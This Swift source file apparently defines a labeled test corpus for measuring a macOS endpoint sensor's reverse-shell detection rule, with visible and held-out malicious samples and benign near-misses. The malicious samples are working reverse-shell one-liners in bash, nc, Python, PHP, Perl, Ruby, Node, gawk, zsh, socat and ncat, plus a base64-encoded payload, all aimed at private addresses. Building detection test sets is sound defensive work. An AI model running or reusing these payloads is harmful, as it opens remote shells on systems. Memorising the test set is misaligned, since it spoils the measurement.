// Corpus.swift
// assessment-framework (P1): the labeled detection corpus for Lane 1 (offline
// event replay). Each sample is the post-shell-parse ARGV a process_creation
// event actually carries — NOT a raw shell string — because ESCollector emits
// `commandLine = args.joined(separator: " ")` (ESCollector.swift:1591), i.e. the
// shell has already stripped the outer quotes and consumed redirection operators
// before exec. Measuring against a quote-laden raw string is a fidelity lie: it
// let brittle literals (e.g. `python3 -c 'import socket,subprocess,os`) score as
// hits that a live sensor would never produce. The corpus below drives the REAL
// representation.
//
// The corpus is built to measure detection ENGINEERING quality, not memorization
// (per Florian Roth): positives span multiple REPRESENTATIONS, split into a
// VISIBLE set (variants a rule author enumerated) and a HELD-OUT set of NOVEL
// variants — none of which is a literal substring of an enumerated rule value —
// so held-out recall measures generalization. The held-out set deliberately
// includes representations the rule cannot see from a command line alone
// (base64-encoded payloads, script-file delivery), so held-out recall is a REAL
// number < 1.0 that moves when the rule changes — the property that distinguishes
// an honest measurement from a tautological green. Negatives include near-misses
// that share a single token (socket, nc, child_process, /bin/) but are benign.

import Foundation

/// One labeled process_creation sample, expressed as the ARGV the Endpoint
/// Security sensor observes (post-shell-parse: outer quotes stripped, redirection
/// operators consumed by the parent shell).
public struct LabeledSample: Sendable, Hashable {
    /// The exec argument vector. `argv[0]` is the program; the rest are its args.
    public let argv: [String]
    /// Ground truth: does this represent the technique under test?
    public let malicious: Bool
    /// Short name for the technique REPRESENTATION (obfuscation/tool variant),
    /// used to compute obfuscation coverage. Empty for negatives.
    public let representation: String
    /// If malicious: a HELD-OUT novel variant (true) or a VISIBLE enumerated
    /// variant (false)? Held-out recall is the anti-memorization axis.
    public let heldOut: Bool

    /// Exactly what ESCollector reconstructs and the rule engine reads
    /// (ESCollector.swift:1591 — `args.joined(separator: " ")`). Deriving it here,
    /// rather than storing a hand-written string, is the fidelity guarantee.
    public var commandLine: String { argv.joined(separator: " ") }

    public init(argv: [String], malicious: Bool, representation: String = "", heldOut: Bool = false) {
        self.argv = argv
        self.malicious = malicious
        self.representation = representation
        self.heldOut = heldOut
    }
}

/// A labeled corpus for one technique.
public struct TechniqueCorpus: Sendable {
    public let technique: String          // e.g. "T1059.004"
    public let targetRuleId: String       // compiled-rule id expected to fire
    public let targetRuleName: String     // human title (fallback match)
    public let samples: [LabeledSample]

    public init(technique: String, targetRuleId: String, targetRuleName: String, samples: [LabeledSample]) {
        self.technique = technique
        self.targetRuleId = targetRuleId
        self.targetRuleName = targetRuleName
        self.samples = samples
    }
}

public enum Corpora {
    /// T1059.004 — reverse shell. Target: Rules/command_and_control/reverse_shell_pattern.yml.
    public static let reverseShell = TechniqueCorpus(
        technique: "T1059.004",
        targetRuleId: "d1a2b3c4-0042-4000-a000-000000000042",
        targetRuleName: "Reverse Shell Command Detected",
        samples: [
            // ── POSITIVES · VISIBLE variants (representations the author enumerated) ──
            LabeledSample(argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
                          malicious: true, representation: "bash-devtcp"),
            LabeledSample(argv: ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
                          malicious: true, representation: "nc-e"),
            LabeledSample(argv: ["python", "-c", "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['/bin/sh'])"],
                          malicious: true, representation: "python-socket"),
            LabeledSample(argv: ["php", "-r", "$sock=fsockopen('10.0.0.1',4444);exec('/bin/sh -i <&3 >&3 2>&3');"],
                          malicious: true, representation: "php-fsockopen"),
            LabeledSample(argv: ["sh", "-c", "/bin/sh -i >& /dev/tcp/192.168.1.5/9001 0>&1"],
                          malicious: true, representation: "sh-devtcp"),

            // ── POSITIVES · HELD-OUT novel variants (generalization test) ──
            // None is a literal substring of an enumerated rule value; each must be
            // caught by a GENERIC mechanism (the /dev/tcp catch, a |all token
            // co-occurrence group) or is a documented behavioral-layer MISS.
            LabeledSample(argv: ["sh", "-c", "bash -i >&/dev/tcp/172.16.0.9/1337 0>&1"],
                          malicious: true, representation: "bash-devtcp-nospace", heldOut: true),
            LabeledSample(argv: ["bash", "-c", "exec 3<>/dev/udp/10.0.0.1/53"],
                          malicious: true, representation: "udp-devudp", heldOut: true),
            LabeledSample(argv: ["python3", "-c", "import os,socket,subprocess;s=socket.socket();s.connect(('10.0.0.2',4444));subprocess.call(['/bin/sh','-i'])"],
                          malicious: true, representation: "python-reordered-imports", heldOut: true),
            LabeledSample(argv: ["python3", "-c", "import pty;pty.spawn('/bin/bash')"],
                          malicious: true, representation: "pty-spawn", heldOut: true),
            LabeledSample(argv: ["sh", "-c", "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"],
                          malicious: true, representation: "mkfifo-nc-pipe", heldOut: true),
            LabeledSample(argv: ["perl", "-e", "use Socket;$i='10.0.0.1';$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));exec('/bin/sh -i');"],
                          malicious: true, representation: "perl-socket", heldOut: true),
            LabeledSample(argv: ["socat", "TCP:10.0.0.1:4444", "EXEC:/bin/sh"],
                          malicious: true, representation: "socat-exec", heldOut: true),
            LabeledSample(argv: ["gawk", "BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";while(1){do{printf \"> \"|&s;s|&getline c;if(c){system(c)}}while(c!=\"exit\")}}"],
                          malicious: true, representation: "gawk-inet", heldOut: true),
            LabeledSample(argv: ["ruby", "-rsocket", "-e", "f=TCPSocket.open('10.0.0.1',4444);exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f.fileno,f.fileno,f.fileno)"],
                          malicious: true, representation: "ruby-tcpsocket", heldOut: true),
            LabeledSample(argv: ["node", "-e", "require('net').connect(4444,'10.0.0.1',function(){var s=require('child_process').spawn('/bin/sh',[]);this.pipe(s.stdin);s.stdout.pipe(this)})"],
                          malicious: true, representation: "node-child-process", heldOut: true),
            LabeledSample(argv: ["zsh", "-c", "zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"],
                          malicious: true, representation: "zsh-ztcp", heldOut: true),
            LabeledSample(argv: ["ncat", "--ssl", "10.0.0.1", "4444", "-e", "/bin/sh"],
                          malicious: true, representation: "ncat-ssl-flags", heldOut: true),
            // Documented HONEST MISSES — the reverse-shell content is not visible
            // in the process_creation command line, so no command-line rule can
            // fire. These keep held-out recall < 1.0 (proving the corpus can
            // discriminate) and mark the true boundary of this detection layer.
            LabeledSample(argv: ["bash", "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 --decode | bash"],
                          malicious: true, representation: "base64-piped", heldOut: true),
            LabeledSample(argv: ["bash", "/tmp/.cache/update.sh"],
                          malicious: true, representation: "script-file-delivery", heldOut: true),

            // ── NEGATIVES · benign, incl. single-token near-misses (FP guard) ──
            LabeledSample(argv: ["git", "commit", "-m", "fix reverse proxy config"], malicious: false),
            LabeledSample(argv: ["ls", "-la", "/usr/bin"], malicious: false),
            LabeledSample(argv: ["curl", "-fsSL", "https://example.com/install.sh"], malicious: false),
            // The CI wait-for-port near-miss that the python_socket |all group
            // used to false-positive on (socket+subprocess+connect+/bin/echo).
            // Must NOT fire now that the group requires a /bin/sh or /bin/bash target.
            LabeledSample(argv: ["python3", "-c", "import socket,subprocess; socket.create_connection(('127.0.0.1',5432)); subprocess.run(['/bin/echo','db up'])"], malicious: false),
            LabeledSample(argv: ["bash", "-c", "echo hello && ls"], malicious: false),
            LabeledSample(argv: ["nc", "-l", "8080"], malicious: false),               // listener, not -e/-c
            LabeledSample(argv: ["nc", "-zv", "example.com", "443"], malicious: false), // port scan
            LabeledSample(argv: ["php", "-v"], malicious: false),
            LabeledSample(argv: ["brew", "install", "netcat"], malicious: false),
            LabeledSample(argv: ["man", "bash"], malicious: false),
            // node child_process WITHOUT a network leg — must not fire selection_node.
            LabeledSample(argv: ["node", "-e", "require('child_process').execSync('/bin/ls')"], malicious: false),
            LabeledSample(argv: ["ls", "/bin/"], malicious: false),                     // bare /bin/ near-miss
            // socat WITHOUT EXEC: — a benign port-forward, must not fire selection_socat.
            LabeledSample(argv: ["socat", "TCP-LISTEN:8080,fork", "TCP:localhost:80"], malicious: false),
            LabeledSample(argv: ["mkfifo", "/tmp/mypipe"], malicious: false),           // mkfifo alone, no nc
            // grep -e /bin/sh — the `-e` + shell near-miss; must not trip the ncat groups.
            LabeledSample(argv: ["grep", "-e", "/bin/sh", "/etc/shells"], malicious: false),
            LabeledSample(argv: ["zsh", "-c", "echo $ZSH_VERSION"], malicious: false),  // zsh, no ztcp
        ]
    )
}
